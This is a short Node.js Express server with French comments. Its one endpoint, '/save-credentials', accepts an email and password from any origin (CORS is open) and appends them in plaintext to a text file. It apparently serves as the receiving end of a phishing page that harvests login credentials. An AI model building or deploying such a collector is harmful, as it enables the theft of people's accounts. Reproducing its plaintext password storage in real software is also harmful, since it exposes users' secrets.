const express = require('express');
const fs = require('fs');
const bodyParser = require('body-parser');
const cors = require('cors');

const app = express();
const port = 3000;

app.use(cors());

// Middleware pour parser les corps de requêtes JSON
app.use(bodyParser.json());

// Endpoint pour recevoir et sauvegarder les données
app.post('/save-credentials', (req, res) => {
  const { email, password } = req.body;

  // Sauvegarde dans un fichier .txt
  const data = `Email: ${email}, Mot de passe: ${password}\n`;
  fs.appendFile('credentials.txt', data, (err) => {
    if (err) {
      console.error('Erreur d\'écriture dans le fichier', err);
      return res.status(500).json({ message: 'Erreur interne du serveur' });
    }
    res.status(200).json({ message: 'Données sauvegardées' });
  });
});

// Démarre le serveur
app.listen(port, () => {
  console.log(`Serveur démarré sur http://localhost:${port}`);
});
